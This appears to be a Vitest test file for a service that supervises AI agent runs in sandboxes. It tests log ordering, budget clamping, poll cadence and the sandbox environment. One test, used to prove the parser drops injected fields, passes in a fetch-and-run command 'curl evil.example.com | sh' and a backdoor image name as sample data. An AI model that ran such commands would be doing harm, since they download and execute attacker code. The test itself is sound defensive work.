import { env } from "cloudflare:test";
import { describe, expect, it } from "vitest";

import {
  harnessLogKey,
  harnessSegmentKey,
  readHarnessOutput,
  runPrefix,
  writeCombinedHarnessLog,
  writeHarnessSegment,
} from "../src/artifacts";
import {
  BUDGET_POLL_HEADROOM,
  DEFAULT_MAX_COST_USD,
  DEFAULT_MAX_WALL_CLOCK_MS,
  MAX_POLL_MS,
  MIN_POLL_MS,
  earliestDeadline,
  pollDelay,
  renewalTtl,
  runConfig,
  spendSample,
  type RunConfig,
  type SpendSample,
} from "../src/run-workflow";
import {
  DEFAULT_SANDBOX_IMAGE,
  isTerminalExit,
  orchestratorEnv,
  sandboxImage,
  sandboxName,
} from "../src/sandbox";
import { parseSubmission } from "../src/runs";

/**
 * The pieces the supervision loop leans on that a run-level test would only
 * cover by accident: log key ordering, budget parsing, cadence.
 */

const PROJECT = "example-org/example-repo";

describe("the harness log stream", () => {
  it("keeps segments in order past the ten and hundred boundaries", async () => {
    const runID = "run_order";
    for (const seq of [1, 2, 9, 10, 11, 99, 100, 101]) {
      await writeHarnessSegment(env.ARTIFACTS, PROJECT, runID, 1, seq, `${seq}\n`);
    }

    // R2 lists lexicographically: unpadded keys would put 10 before 9 and
    // silently reorder the log.
    expect(await readHarnessOutput(env.ARTIFACTS, PROJECT, runID)).toBe(
      "1\n2\n9\n10\n11\n99\n100\n101\n"
    );
  });

  it("orders one boot's output before the next boot's", async () => {
    const runID = "run_boots";
    await writeHarnessSegment(env.ARTIFACTS, PROJECT, runID, 1, 7, "first sandbox\n");
    await writeHarnessSegment(env.ARTIFACTS, PROJECT, runID, 2, 1, "replacement sandbox\n");

    expect(await readHarnessOutput(env.ARTIFACTS, PROJECT, runID)).toBe(
      "first sandbox\nreplacement sandbox\n"
    );
  });

  it("writes nothing for a poll that saw no output", async () => {
    const runID = "run_quiet";
    expect(await writeHarnessSegment(env.ARTIFACTS, PROJECT, runID, 1, 1, "")).toBe(false);

    const listed = await env.ARTIFACTS.list({ prefix: runPrefix(PROJECT, runID) });
    expect(listed.objects).toHaveLength(0);
  });

  it("keeps every run's artifacts under its own project-scoped prefix", () => {
    expect(harnessSegmentKey(PROJECT, "run_x", 2, 5)).toBe(
      `runs/${PROJECT}/run_x/artifacts/orchestrator/harness/002/000005.log`
    );
    expect(harnessLogKey(PROJECT, "run_x")).toBe(
      `runs/${PROJECT}/run_x/artifacts/orchestrator/harness.log`
    );
  });

  it("collapses the stream into one object at finalize without losing it", async () => {
    const runID = "run_combined";
    await writeHarnessSegment(env.ARTIFACTS, PROJECT, runID, 1, 1, "a\n");
    await writeHarnessSegment(env.ARTIFACTS, PROJECT, runID, 1, 2, "b\n");
    await writeCombinedHarnessLog(env.ARTIFACTS, PROJECT, runID);

    const combined = await env.ARTIFACTS.get(harnessLogKey(PROJECT, runID));
    await expect(combined!.text()).resolves.toBe("a\nb\n");
    // The segments remain the durable record; the combined log is a copy.
    expect(await readHarnessOutput(env.ARTIFACTS, PROJECT, runID)).toBe("a\nb\n");
  });
});

describe("budget configuration", () => {
  it("falls back to the defaults when nothing is set", () => {
    const config = runConfig({} as never);

    expect(config.max_wall_clock_ms).toBe(DEFAULT_MAX_WALL_CLOCK_MS);
    expect(config.max_cost_usd).toBe(DEFAULT_MAX_COST_USD);
    expect(config.cost_budget_configured).toBe(false);
    expect(config.poll_interval_ms).toBeNull();
  });

  it("ignores an unusable budget rather than taking the factory down", () => {
    const config = runConfig({
      RUN_MAX_WALL_CLOCK_MS: "soon",
      RUN_MAX_COST_USD: "-4",
    } as never);

    expect(config.max_wall_clock_ms).toBe(DEFAULT_MAX_WALL_CLOCK_MS);
    expect(config.max_cost_usd).toBe(DEFAULT_MAX_COST_USD);
    expect(config.cost_budget_configured).toBe(false);
  });

  it("reads a fractional cost budget but an integral clock", () => {
    const config = runConfig({ RUN_MAX_COST_USD: "2.50", RUN_MAX_WALL_CLOCK_MS: "60000" } as never);

    expect(config.max_cost_usd).toBe(2.5);
    expect(config.cost_budget_configured).toBe(true);
    expect(config.max_wall_clock_ms).toBe(60_000);
  });

  // A per-run budget is bounded by the deployment's, in one direction only:
  // the ceiling is the operator's standing decision and a submission — which
  // an agent can make — must never be able to widen it.
  it("lets a submission lower the deployment ceiling", () => {
    const config = runConfig(
      { RUN_MAX_COST_USD: "8", RUN_MAX_WALL_CLOCK_MS: "2700000" } as never,
      { max_cost_usd: 2, max_wall_clock_ms: 600_000 }
    );

    expect(config.max_cost_usd).toBe(2);
    expect(config.max_wall_clock_ms).toBe(600_000);
  });

  it("clamps a submission that tries to raise the deployment ceiling", () => {
    const config = runConfig(
      { RUN_MAX_COST_USD: "8", RUN_MAX_WALL_CLOCK_MS: "2700000" } as never,
      { max_cost_usd: 50, max_wall_clock_ms: 21_600_000 }
    );

    expect(config.max_cost_usd).toBe(8);
    expect(config.max_wall_clock_ms).toBe(2_700_000);
  });

  // The deployment set no cost var, so the default stood and unreadable
  // telemetry was survivable. A submission that names a cost budget has asked
  // for one, so it is enforced like any other — including its failure mode.
  it("counts a submitted cost budget as configured", () => {
    const config = runConfig({} as never, { max_cost_usd: 3 });

    expect(config.max_cost_usd).toBe(3);
    expect(config.cost_budget_configured).toBe(true);
  });

  it("ignores an unusable override rather than widening the budget", () => {
    const config = runConfig(
      { RUN_MAX_COST_USD: "8" } as never,
      { max_cost_usd: -1, max_wall_clock_ms: Number.NaN }
    );

    expect(config.max_cost_usd).toBe(8);
    expect(config.max_wall_clock_ms).toBe(DEFAULT_MAX_WALL_CLOCK_MS);
  });
});

describe("a submission's own budget", () => {
  const base = {
    project: "example-org/example-repo",
    epic: "ko8",
    base_sha: "b".repeat(40),
    requested_by: "operator@example.com",
  };

  it("accepts a fractional cost and an integral clock", () => {
    const parsed = parseSubmission({ ...base, max_cost_usd: 2.5, max_wall_clock_ms: 2_700_000 });

    expect(parsed.ok).toBe(true);
    if (!parsed.ok) return;
    expect(parsed.submission.max_cost_usd).toBe(2.5);
    expect(parsed.submission.max_wall_clock_ms).toBe(2_700_000);
  });

  it("carries no budget when the submission names none", () => {
    const parsed = parseSubmission(base);

    expect(parsed.ok).toBe(true);
    if (!parsed.ok) return;
    expect(parsed.submission.max_cost_usd).toBeUndefined();
    expect(parsed.submission.max_wall_clock_ms).toBeUndefined();
  });

  // Refused at the edge rather than ignored deeper in: a budget the factory
  // silently dropped is a run the operator believes is bounded and is not.
  it("refuses a budget that is not a positive number", () => {
    const bad: Record<string, unknown>[] = [
      { max_cost_usd: 0 },
      { max_cost_usd: -2 },
      { max_cost_usd: "2.50" },
      { max_cost_usd: Number.POSITIVE_INFINITY },
      { max_wall_clock_ms: 0 },
      { max_wall_clock_ms: -1 },
      { max_wall_clock_ms: 1.5 },
      { max_wall_clock_ms: "600000" },
    ];
    for (const extra of bad) {
      const parsed = parseSubmission({ ...base, ...extra });
      expect(parsed.ok, JSON.stringify(extra)).toBe(false);
    }
  });
});

describe("observation cadence", () => {
  it("starts fast and backs off to a cadence a long run can afford", () => {
    const config = runConfig({} as never);

    expect(pollDelay(config, 0)).toBe(MIN_POLL_MS);
    expect(pollDelay(config, 5)).toBeGreaterThan(MIN_POLL_MS);
    expect(pollDelay(config, 99)).toBe(MAX_POLL_MS);
  });

  it("honours a fixed interval when the deployment sets one", () => {
    const config = runConfig({ RUN_POLL_INTERVAL_MS: "1000" } as never);

    expect(pollDelay(config, 0)).toBe(1000);
    expect(pollDelay(config, 50)).toBe(1000);
  });

  it("renews the lease for longer than the gap to the next look", () => {
    // Otherwise the run expires its own lease between two observations and
    // hands the project to a queued submission while it is still working.
    for (const poll of [1, MIN_POLL_MS, MAX_POLL_MS]) {
      expect(renewalTtl(poll)).toBeGreaterThan(poll);
    }
  });
});

/**
 * A budget is only as tight as the cadence that samples it. `detectTrip` runs
 * on an observation and nowhere else, so whatever a run burns during a sleep
 * is spent unwatched — and the backoff stretches that sleep to five minutes
 * exactly on the long, expensive runs where it costs the most.
 *
 * These walk the real loop's arithmetic: the same `pollDelay` the supervision
 * loop calls, fed by the same `spendSample` fold, with `cadence: null` standing
 * in for the old behaviour so the regression is pinned next to its fix.
 */
describe("budget-aware cadence", () => {
  const MINUTE = 60_000;

  /**
   * Replays the supervision loop's sleep/observe alternation against a run
   * burning at a constant rate, and reports what it cost to notice the trip.
   */
  function simulate(
    config: RunConfig,
    options: { rate_usd_per_ms: number; started_at_ms: number; budget_aware: boolean }
  ): { overshoot_usd: number; overshoot_ms: number; looks: number } {
    let now = options.started_at_ms;
    let cost = 0;
    let spend: SpendSample | null = null;

    for (let look = 0; look < config.max_observations; look++) {
      const pollMs = pollDelay(
        config,
        look,
        options.budget_aware
          ? {
              now_ms: now,
              deadline_ms: options.started_at_ms + config.max_wall_clock_ms,
              spend,
            }
          : null
      );
      now += pollMs;
      cost += pollMs * options.rate_usd_per_ms;

      const elapsed = now - options.started_at_ms;
      const tripped = cost >= config.max_cost_usd || elapsed >= config.max_wall_clock_ms;
      if (tripped) {
        return {
          overshoot_usd: Math.max(0, cost - config.max_cost_usd),
          overshoot_ms: Math.max(0, elapsed - config.max_wall_clock_ms),
          looks: look + 1,
        };
      }
      spend = spendSample(spend, cost, now);
    }
    throw new Error("the run never crossed a budget within its observation allowance");
  }

  it("does not overshoot a cost ceiling by a full backed-off poll", () => {
    // run_62c289d1's shape: a $5 ceiling, spend recorded correctly at $5.86,
    // the run still `running` with no trip. Accounting was right, cadence was
    // not — $10.30/hour is the rate that turns one 300s sleep into that $0.86.
    const config = runConfig({ RUN_MAX_COST_USD: "5", RUN_MAX_WALL_CLOCK_MS: "21600000" } as never);
    const rate = 10.3 / (60 * MINUTE);

    const before = simulate(config, { rate_usd_per_ms: rate, started_at_ms: 0, budget_aware: false });
    const after = simulate(config, { rate_usd_per_ms: rate, started_at_ms: 0, budget_aware: true });

    // How far a crossing lands into the sleep it happens in is luck, so the
    // defect is stated as the window rather than one sampled number: the old
    // cadence can spend anything up to a full 300s ceiling unwatched, and did.
    const window = MAX_POLL_MS * rate;
    expect(before.overshoot_usd).toBeGreaterThan(MIN_POLL_MS * rate);
    expect(before.overshoot_usd).toBeLessThanOrEqual(window);

    // The bound: one FAST poll's worth of burn, not one backed-off poll's —
    // the same window narrowed by MAX_POLL_MS / MIN_POLL_MS, twenty-fold.
    expect(after.overshoot_usd).toBeLessThanOrEqual(MIN_POLL_MS * rate);
    expect(after.overshoot_usd).toBeLessThan(before.overshoot_usd);
  });

  it("pays only a handful of extra looks for the tighter approach", () => {
    // Halving the headroom each look means the tightening is logarithmic, so
    // it cannot exhaust MAX_OBSERVATIONS and turn a budget trip into the
    // wrong kind of stop ("ran out of looks" is a clean stop, not a breach).
    const config = runConfig({ RUN_MAX_COST_USD: "5", RUN_MAX_WALL_CLOCK_MS: "21600000" } as never);
    const rate = 10.3 / (60 * MINUTE);

    const before = simulate(config, { rate_usd_per_ms: rate, started_at_ms: 0, budget_aware: false });
    const after = simulate(config, { rate_usd_per_ms: rate, started_at_ms: 0, budget_aware: true });

    expect(after.looks - before.looks).toBeLessThanOrEqual(10);
    expect(after.looks).toBeLessThan(config.max_observations);
  });

  it("stops the sleep at the wall-clock deadline instead of past it", () => {
    // run a1f87597: a 45-minute ceiling crossed at 11:29:52, the token revoked
    // at 11:31:59 — two minutes of unwatched run, because the crossing landed
    // partway through a sleep. The clock needs no projection, so this is exact.
    const config = runConfig({ RUN_MAX_WALL_CLOCK_MS: String(45 * MINUTE) } as never);
    const rate = 0.5 / (60 * MINUTE);

    const before = simulate(config, { rate_usd_per_ms: rate, started_at_ms: 0, budget_aware: false });
    const after = simulate(config, { rate_usd_per_ms: rate, started_at_ms: 0, budget_aware: true });

    expect(before.overshoot_ms).toBeGreaterThan(0);
    expect(after.overshoot_ms).toBe(0);
  });

  it("caps a sleep at the headroom the observed burn rate would spend", () => {
    const config = runConfig({ RUN_MAX_COST_USD: "5" } as never);
    const rate = 1 / MINUTE; // a dollar a minute
    const spend: SpendSample = { cost_usd: 4, at_ms: 0, rate_usd_per_ms: rate };

    // $1 of headroom at $1/minute is a minute away; half of that is the cap,
    // and it wins over the 300s the backoff wanted at this look.
    expect(pollDelay(config, 99, { now_ms: 0, deadline_ms: null, spend })).toBe(
      MINUTE * BUDGET_POLL_HEADROOM
    );
  });

  it("leaves the backoff alone while a run is nowhere near its ceiling", () => {
    const config = runConfig({ RUN_MAX_COST_USD: "25" } as never);
    const spend: SpendSample = { cost_usd: 1, at_ms: 0, rate_usd_per_ms: 3 / (60 * MINUTE) };

    // The tightening is for the last stretch. A run three dollars an hour into
    // a $25 ceiling still gets the cadence a multi-hour run can afford.
    expect(pollDelay(config, 99, { now_ms: 0, deadline_ms: null, spend })).toBe(MAX_POLL_MS);
  });

  it("looks immediately once a reading is already at or past the ceiling", () => {
    const config = runConfig({ RUN_MAX_COST_USD: "5" } as never);
    const spend: SpendSample = { cost_usd: 5.86, at_ms: 0, rate_usd_per_ms: null };

    // No rate needed: the next look is the one that trips, and every
    // millisecond until it is unwatched spend.
    expect(pollDelay(config, 99, { now_ms: 0, deadline_ms: null, spend })).toBe(MIN_POLL_MS);
  });

  it("never shortens below the fast cadence, or lengthens anything", () => {
    const config = runConfig({ RUN_MAX_COST_USD: "5" } as never);
    const spend: SpendSample = { cost_usd: 4.99, at_ms: 0, rate_usd_per_ms: 1 / MINUTE };

    // A cap of ~0.3s is real but useless: polling faster than MIN_POLL_MS
    // burns the observation allowance the run needs to reach its own trip.
    expect(pollDelay(config, 99, { now_ms: 0, deadline_ms: null, spend })).toBe(MIN_POLL_MS);
    // And the first look, where the backoff is already at the floor, cannot be
    // stretched by a cadence that has nothing to say.
    expect(pollDelay(config, 0, { now_ms: 0, deadline_ms: 10 ** 12, spend: null })).toBe(
      MIN_POLL_MS
    );
  });

  it("caps a deployment's fixed interval too, without overriding a fast one", () => {
    // A fixed 300s cadence has the same defect as the backoff's ceiling.
    const slow = runConfig({ RUN_POLL_INTERVAL_MS: "300000", RUN_MAX_COST_USD: "5" } as never);
    const spend: SpendSample = { cost_usd: 4.5, at_ms: 0, rate_usd_per_ms: 1 / MINUTE };
    expect(pollDelay(slow, 0, { now_ms: 0, deadline_ms: null, spend })).toBe(
      30_000 * BUDGET_POLL_HEADROOM
    );

    // But an operator who asked for a one-second cadence gets one second: the
    // floor may never make a poll SLOWER than the interval that was configured.
    const fast = runConfig({ RUN_POLL_INTERVAL_MS: "1000", RUN_MAX_COST_USD: "5" } as never);
    expect(pollDelay(fast, 0, { now_ms: 0, deadline_ms: null, spend })).toBe(1000);
    expect(pollDelay(fast, 0, { now_ms: 0, deadline_ms: 1, spend: null })).toBe(1000);
  });
});

describe("the spend sample the cadence is derived from", () => {
  it("measures the recent gap, not the average since the run started", () => {
    // A run that idles through boot and then burns hard has an average that
    // badly understates what the next five minutes will cost.
    let spend = spendSample(null, 0, 0);
    spend = spendSample(spend, 0, 600_000); // ten quiet minutes
    spend = spendSample(spend, 2, 660_000); // then $2 in one

    expect(spend!.cost_usd).toBe(2);
    expect(spend!.rate_usd_per_ms).toBeCloseTo(2 / 60_000, 12);
  });

  it("keeps the last known rate through a gap that read no new spend", () => {
    // Gateway logs land in batches, so a look can read the same total twice.
    // Forgetting the rate there would reopen the window to the full backoff
    // at the exact moment the previous look said money was moving.
    let spend = spendSample(null, 1, 0);
    spend = spendSample(spend, 3, 60_000);
    const rate = spend!.rate_usd_per_ms;
    spend = spendSample(spend, 3, 120_000);

    expect(spend!.rate_usd_per_ms).toBe(rate);
  });

  it("treats a missing reading as missing, never as zero", () => {
    // A pass that does not enforce budgets reads no cost at all. Folding that
    // in as $0 would tell the cadence the run had stopped spending.
    const spend = spendSample(null, 2, 0);
    expect(spendSample(spend, null, 60_000)).toBe(spend);
  });

  it("never reports a negative rate when a reading goes backwards", () => {
    // syncRunCost refuses to lower a recorded total, but the sample must not
    // depend on that: a negative rate would compute a negative cap.
    let spend = spendSample(null, 5, 0);
    spend = spendSample(spend, 4, 60_000);
    expect(spend!.rate_usd_per_ms).toBeNull();
  });
});

describe("the deadline a sleep may not run past", () => {
  it("takes whichever of the run and pass windows arrives first", () => {
    expect(earliestDeadline(100, 50)).toBe(50);
    expect(earliestDeadline(50, 100)).toBe(50);
    expect(earliestDeadline(null, 50)).toBe(50);
    expect(earliestDeadline(50, null)).toBe(50);
    expect(earliestDeadline(null, null)).toBeNull();
  });
});

describe("the image contract", () => {
  it("treats the entrypoint's configuration exits as terminal", () => {
    // 2 config, 3 clone, 4 tk version, 5 pre-flight, 6 the repository's own
    // [sandbox] setup — see cloud/sandbox. A setup command that fails fails
    // identically in a fresh container: it is tracked config, not weather.
    for (const code of [2, 3, 4, 5, 6]) expect(isTerminalExit(code)).toBe(true);
    // A crashed harness is a reboot, not a verdict.
    for (const code of [1, 42, 137, 143]) expect(isTerminalExit(code)).toBe(false);
    expect(isTerminalExit(null)).toBe(false);
  });

  it("names a fresh sandbox per boot", () => {
    expect(sandboxName("run_a", 1)).not.toBe(sandboxName("run_a", 2));
  });

  it("omits optional variables rather than setting them empty", () => {
    const built = orchestratorEnv({
      run_id: "run_a",
      epic: "ko8",
      base_sha: "b".repeat(40),
      repo_url: "https://github.com/example-org/example-repo.git",
      gateway_base_url: "https://factory.example.com/api/gateway",
      gateway_token: "tkr_deadbeef",
      phase: "run",
      github_token: "",
    });

    // An empty GITHUB_TOKEN would install a credential helper that answers
    // with no password, which fails later and less clearly than not being set.
    expect(built).not.toHaveProperty("GITHUB_TOKEN");
    expect(built).not.toHaveProperty("TICKS_STOP_REASON");
    expect(built.TICKS_PHASE).toBe("run");
    // The run's gateway credential is not optional: a sandbox with no token
    // cannot make a model call at all (D17).
    expect(built.AI_GATEWAY_TOKEN).toBe("tkr_deadbeef");
  });
});

describe("the per-repo sandbox declaration", () => {
  it("boots the bundled image unless the deployment pushed its own", () => {
    expect(sandboxImage({} as never)).toBe(DEFAULT_SANDBOX_IMAGE);
    expect(sandboxImage({ SANDBOX_IMAGE: "  " } as never)).toBe(DEFAULT_SANDBOX_IMAGE);
    expect(sandboxImage({ SANDBOX_IMAGE: "registry.example.com/acme/orchestrator:2.0.0" } as never)).toBe(
      "registry.example.com/acme/orchestrator:2.0.0"
    );
  });

  it("tells the container which image it got, so a repo asking for another is not ignored silently", () => {
    const built = orchestratorEnv({
      run_id: "run_a",
      epic: "ko8",
      base_sha: "b".repeat(40),
      repo_url: "https://github.com/example-org/example-repo.git",
      gateway_base_url: "https://factory.example.com/api/gateway",
      gateway_token: "tkr_deadbeef",
      phase: "run",
      sandbox_image: "ticks-orchestrator:0.32.0",
    });

    expect(built.TICKS_SANDBOX_IMAGE).toBe("ticks-orchestrator:0.32.0");
  });

  // THE security boundary of the [sandbox] table, at the control plane's edge.
  // Setup commands run arbitrary shell inside a container holding the run's
  // gateway token and GitHub credential, so they come from the repository's
  // tracked config at the submitted SHA — read inside the container by `tk` —
  // and there is no path for them through the API or the sandbox environment.
  it("cannot be injected through a submission parameter or the sandbox environment", () => {
    const parsed = parseSubmission({
      project: "example-org/example-repo",
      epic: "ko8",
      base_sha: "b".repeat(40),
      requested_by: "operator@example.com",
      // Every shape an attacker (or a well-meaning caller) might try.
      sandbox: { setup: [{ command: "curl evil.example.com | sh" }] },
      setup: ["curl evil.example.com | sh"],
      sandbox_setup: "curl evil.example.com | sh",
      image: "evil.example.com/backdoor:latest",
    });

    expect(parsed.ok).toBe(true);
    if (!parsed.ok) return;
    // The submission carries exactly the closed field set; nothing else
    // survives parsing, so nothing else can reach the Workflow's params.
    expect(Object.keys(parsed.submission).sort()).toEqual(
      ["base_sha", "epic", "project", "queue", "requested_by"].sort()
    );
    expect(JSON.stringify(parsed.submission)).not.toContain("evil.example.com");

    // And the environment the container is booted with has no variable that
    // could carry one either: the entrypoint reads setup from the checkout.
    const built = orchestratorEnv({
      run_id: "run_a",
      epic: "ko8",
      base_sha: "b".repeat(40),
      repo_url: "https://github.com/example-org/example-repo.git",
      gateway_base_url: "https://factory.example.com/api/gateway",
      gateway_token: "tkr_deadbeef",
      phase: "run",
    });
    for (const name of Object.keys(built)) {
      expect(name).not.toMatch(/SETUP/i);
    }
    expect(JSON.stringify(built)).not.toContain("evil.example.com");
  });
});
